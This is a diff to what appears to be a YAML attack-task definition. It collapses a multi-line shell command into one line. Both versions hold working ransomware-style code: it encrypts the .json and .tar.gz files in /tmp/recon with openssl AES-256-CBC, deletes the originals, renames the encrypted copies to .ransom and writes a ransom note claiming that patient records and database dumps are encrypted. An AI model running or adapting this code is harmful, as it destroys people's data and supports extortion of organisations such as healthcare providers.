@@ -10,23 +10,4 @@
       sh:
         timeout: 120
         command: |
-          OUTDIR="/tmp/recon"; R_KEY="RansomKey_$(hostname)_$(date +%s)"; K_FILE="$OUTDIR/.ransom_key"; COUNT=0; \
-          if [ ! -d "$OUTDIR" ]; then echo "[-] No collected data directory found"; exit 1; fi; \
-          echo "$R_KEY" > "$K_FILE"; \
-          for f in "$OUTDIR"/*.json "$OUTDIR"/*.tar.gz; do \
-            [ -f "$f" ] || continue; \
-            if openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$R_KEY" -in "$f" -out "$f.enc" 2>/dev/null; then \
-              rm "$f"; mv "$f.enc" "$f.ransom"; COUNT=$((COUNT+1)); echo "[!] Encrypted: $f"; \
-            fi; \
-          done; \
-          if [ "$COUNT" -eq 0 ]; then echo "[-] No files to encrypt"; exit 1; fi; \
-          echo "========================================" > "$OUTDIR/README_DECRYPT.txt"; \
-          echo "  YOUR FILES HAVE BEEN ENCRYPTED" >> "$OUTDIR/README_DECRYPT.txt"; \
-          echo "========================================" >> "$OUTDIR/README_DECRYPT.txt"; \
-          echo "All patient records and database dumps" >> "$OUTDIR/README_DECRYPT.txt"; \
-          echo "have been encrypted with AES-256-CBC." >> "$OUTDIR/README_DECRYPT.txt"; \
-          echo "Contact us to negotiate decryption." >> "$OUTDIR/README_DECRYPT.txt"; \
-          echo "========================================" >> "$OUTDIR/README_DECRYPT.txt"; \
-          echo "[!] $COUNT files encrypted. Ransom note dropped."; \
-          echo "[!] Encryption key: $R_KEY"; \
-          cat "$OUTDIR/README_DECRYPT.txt"
+          OUTDIR="/tmp/recon"; R_KEY="RansomKey_$(hostname)_$(date +%s)"; K_FILE="$OUTDIR/.ransom_key"; COUNT=0; if [ ! -d "$OUTDIR" ]; then echo "[-] No collected data directory found"; exit 1; fi; echo "$R_KEY" > "$K_FILE"; for f in "$OUTDIR"/*.json "$OUTDIR"/*.tar.gz; do [ -f "$f" ] || continue; if openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$R_KEY" -in "$f" -out "$f.enc" 2>/dev/null; then rm "$f"; mv "$f.enc" "$f.ransom"; COUNT=$((COUNT+1)); echo "[!] Encrypted: $f"; fi; done; if [ "$COUNT" -eq 0 ]; then echo "[-] No files to encrypt"; exit 1; fi; echo "========================================" > "$OUTDIR/README_DECRYPT.txt"; echo "  YOUR FILES HAVE BEEN ENCRYPTED" >> "$OUTDIR/README_DECRYPT.txt"; echo "========================================" >> "$OUTDIR/README_DECRYPT.txt"; echo "All patient records and database dumps" >> "$OUTDIR/README_DECRYPT.txt"; echo "have been encrypted with AES-256-CBC." >> "$OUTDIR/README_DECRYPT.txt"; echo "Contact us to negotiate decryption." >> "$OUTDIR/README_DECRYPT.txt"; echo "========================================" >> "$OUTDIR/README_DECRYPT.txt"; echo "[!] $COUNT files encrypted. Ransom note dropped."; echo "[!] Encryption key: $R_KEY"; cat "$OUTDIR/README_DECRYPT.txt"
